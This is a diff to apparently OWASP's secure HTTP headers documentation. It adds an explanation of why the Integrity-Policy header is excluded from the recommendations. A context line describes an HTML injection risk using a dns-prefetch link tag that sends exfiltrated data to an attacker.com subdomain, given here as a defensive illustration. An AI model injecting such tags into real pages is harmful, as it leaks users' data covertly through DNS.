@@ -38,6 +38,8 @@ The following section proposes a configuration for the [actively supported and w
 * Return sensitive or private content (commonly called [PII](https://en.wikipedia.org/wiki/Personal_data)).
 * Prone to HTML injection where an attacker can inject a tag `<link rel="dns-prefetch" href="//[exfiltrated data encoded].attacker.com">` to exfiltrate data quietly via DNS or be notified via DNS when the victim rendered the response in a browser.
 
+🚩 Regarding the header `Integrity-Policy`, it was not added to the list of headers to add as it requires that all the *scripts* and/or *styles* of the application specify the [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity) information. Therefore, adding this header will break the correct execution in the browser if the mentioned condition is not fulfilled.
+
 🔬 For the header `Permissions-Policy`, as it is currently only supported by [Chromium based browsers](https://caniuse.com/permissions-policy), the proposed value was generated with this [site](https://www.permissionspolicy.com/) and tested against the version `140.0.7292.0` of [Chromium](https://chromium.woolyss.com/download/en/) to only specify supported features.
 
 💡 Content of the table below is also provided, as JSON, via this [file](https://github.com/OWASP/www-project-secure-headers/blob/master/ci/headers_add.json) (automatically updated).
